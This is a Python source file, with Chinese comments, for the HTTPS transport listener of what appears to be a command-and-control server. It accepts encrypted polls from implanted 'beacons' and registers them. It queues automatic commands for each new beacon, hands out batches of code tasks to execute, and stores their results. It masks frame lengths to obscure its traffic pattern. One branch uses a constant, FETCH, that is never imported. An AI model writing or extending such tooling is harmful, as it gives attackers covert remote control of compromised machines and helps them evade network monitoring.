"""server/infra/https_listener.py — HTTPS 传输监听器（f8）。

beacon 经 HTTPS POST 隧道轮询（无状态，fire-and-forget）：
  POST body = 标准加密帧（register / result），空 body = 轮询取任务。
  响应 = 单个加密帧（welcome / task / pong）。

URL: /poll/<beacon_id>（空轮询按 URL 的 id 取任务，register 帧里自带 id）

register / 结果落库 / auto_commands / 结果处理器 复用 sessions/engine.py，
与 TCP 通道行为一致（via/fork/shell 元数据 + 结果处理器均生效）。
"""

import json
import struct
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from server.core.crypto import encode_frame, decode_frame
from server.core.protocol import (REGISTER, RESULT, WELCOME, PONG, TASKS,
                                  frame_mask, validate_message)
from server.sessions.engine import (
    register_beacon, store_result, build_auto_tasks, take_task_batch, InFlight,
)


class _Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *args):
        pass

    def do_POST(self):
        srv = self.server
        length = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(length) if length else b""
        try:
            resp = self._handle(body, srv)
        except Exception:
            resp = self._frame({"type": PONG}, srv)
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(resp)))
        self.end_headers()
        try:
            self.wfile.write(resp)
        except (BrokenPipeError, ConnectionError):
            pass

    # ── 协议处理（无状态） ──

    def _frame(self, msg: dict, srv) -> bytes:
        payload = encode_frame(json.dumps(msg).encode("utf-8"), srv.key)
        # 长度头掩码(与 protocol.send_frame 一致,混淆长度分布)
        return struct.pack(">I", len(payload) ^ frame_mask(srv.key)) + payload

    def _handle(self, body: bytes, srv) -> bytes:
        if body:
            try:
                raw = decode_frame(body[4:], srv.key)
                msg = json.loads(raw.decode("utf-8"))
            except Exception:
                return self._frame({"type": PONG}, srv)
            # M3：与 TCP 通道一致的整帧校验
            if validate_message(msg):
                return self._frame({"type": PONG}, srv)
            mtype = msg.get("type")
            if mtype == REGISTER:
                bid, is_new = register_beacon(msg, srv.mgr, srv.events)
                if is_new:
                    for task in build_auto_tasks(srv.config.auto_commands,
                                                 bid, srv.dispatcher):
                        srv.tq.push(bid, task)
                return self._frame({"type": WELCOME, "version": 2}, srv)
            if mtype == RESULT:
                bid = self.path.rsplit("/", 1)[-1]
                rp, pa = srv.inflight.take(msg.get("task_id", ""))
                store_result(bid, msg.get("task_id", ""),
                             msg.get("output", ""), msg.get("error", ""),
                             srv.mgr, srv.events, srv.config.max_result_size,
                             smods=srv.smods, dispatcher=srv.dispatcher,
                             result_processor=rp, proc_arg=pa)
                # v2 批量: 逐条确认(acked=[该 task_id]) + 顺带领取一批新任务
                return self._batch_response(srv, bid, [msg.get("task_id", "")])
            if mtype == FETCH:
                bid = self.path.rsplit("/", 1)[-1]
                return self._batch_response(srv, bid, [])
            return self._frame({"type": PONG}, srv)

        # 空 body：轮询领取任务（v2 批量: 每次响应一批,取完继续轮询）
        bid = self.path.rsplit("/", 1)[-1]
        if bid and bid != "poll":
            return self._batch_response(srv, bid, [])
        return self._frame({"type": PONG}, srv)

    def _batch_response(self, srv, bid: str, acked: list) -> bytes:
        """按预算领取一批任务 → TASKS 帧(acked 确认 + tasks 批量)。

        无任务时: 有 acked 回空 TASKS 帧(确认必须送达), 否则 PONG。
        """
        budget = max(4096, int(getattr(srv.config, "max_frame_size", 512 * 1024) * 0.8))
        tasks = take_task_batch(bid, srv.tq, budget)
        if not tasks:
            if acked:
                return self._frame(
                    {"type": TASKS, "tasks": [], "acked": list(acked)}, srv)
            return self._frame({"type": PONG}, srv)
        for t in tasks:
            srv.inflight.track(t)  # 登记 result_processor(无状态通道续传用)
        return self._frame(
            {"type": TASKS,
             "tasks": [{"task_id": t.task_id, "code": t.code} for t in tasks],
             "acked": list(acked)}, srv)


class HttpsTransport:
    """HTTPS 传输监听器（TLS + 帧隧道）。"""

    def __init__(self, host: str, port: int, key: bytes,
                 mgr, tq, events, cert_file: str, key_file: str,
                 config=None, smods=None, dispatcher=None):
        self._httpd = ThreadingHTTPServer((host, port), _Handler)
        # 上下文挂到 server 实例供 handler 读取
        self._httpd.key = key
        self._httpd.mgr = mgr
        self._httpd.tq = tq
        self._httpd.events = events
        self._httpd.config = config
        self._httpd.smods = smods
        self._httpd.dispatcher = dispatcher
        self._httpd.inflight = InFlight()

        import ssl
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(cert_file, key_file)
        self._httpd.socket = ctx.wrap_socket(self._httpd.socket,
                                             server_side=True)
        self._thread = threading.Thread(target=self._httpd.serve_forever,
                                        daemon=True)

    def start(self) -> None:
        self._thread.start()

    def stop(self) -> None:
        self._httpd.shutdown()
        self._httpd.server_close()
